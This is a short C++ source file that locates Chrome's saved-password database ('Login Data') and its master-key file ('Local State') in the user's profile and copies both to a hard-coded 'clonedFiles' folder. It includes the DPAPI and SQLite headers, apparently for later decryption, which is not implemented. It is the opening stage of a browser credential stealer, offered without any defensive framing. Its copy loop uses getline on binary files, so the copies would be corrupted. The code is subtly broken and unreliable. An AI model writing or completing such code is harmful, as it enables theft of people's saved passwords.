#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif

#include <iostream>
#include <fstream>
#include <string>
#include <Windows.h>
#include <cstdlib>
#include <dpapi.h>
#include <wincrypt.h>
#include "sqlite3.h"
using namespace std;

int main() {
	char* userProfile = getenv("USERPROFILE");
	string passwordsFilePath = userProfile;
	string masterKeyPath = userProfile;

	passwordsFilePath += "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
	masterKeyPath += "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";

	ifstream masterKeyFile(masterKeyPath, ios::binary);
	string masterKeyFileContent;

	if (masterKeyFile.is_open()) {

		ofstream contentLanding("C:/Users/tissln22teoves/Documents/clonedFiles/clonedLocalState");
		while (getline(masterKeyFile, masterKeyFileContent))
		{
			contentLanding << masterKeyFileContent;
		}
		masterKeyFile.close();
	}

	else {
		cout << "Unable to fetch Local State file.";
	}
	
	ifstream loginFile(passwordsFilePath, ios::binary);
	string passwordsFileContent;
	
	if (loginFile.is_open()) {

		ofstream contentLanding("C:/Users/tissln22teoves/Documents/clonedFiles/clonedLoginData");
		while (getline(loginFile, passwordsFileContent))
		{
			contentLanding << passwordsFileContent;
		}
		loginFile.close();
	}

	else {
		cout << "Unable to fetch Login Data file.";
	}



}